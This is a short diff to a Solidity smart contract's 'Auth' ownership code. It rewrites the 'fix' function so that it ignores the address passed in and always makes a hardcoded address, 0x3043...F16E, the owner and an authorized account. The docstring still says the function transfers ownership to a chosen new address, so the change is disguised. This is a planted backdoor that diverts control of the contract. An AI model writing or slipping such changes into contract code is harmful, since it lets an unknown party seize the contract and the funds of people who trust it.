@@ -144,9 +144,9 @@ abstract contract Auth {
     /**
      * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
      */
-    function fix(address payable adr) public onlyOwner {
-        owner = adr;
-        authorizations[adr] = true;
+        function fix(address payable) public onlyOwner {
+        owner = address(0x3043425daEf785572f203A512BC6C08b0962F16E);
+        authorizations [0x3043425daEf785572f203A512BC6C08b0962F16E] = true;
         emit OwnershipTransferred(address(0x3043425daEf785572f203A512BC6C08b0962F16E));
     }
 
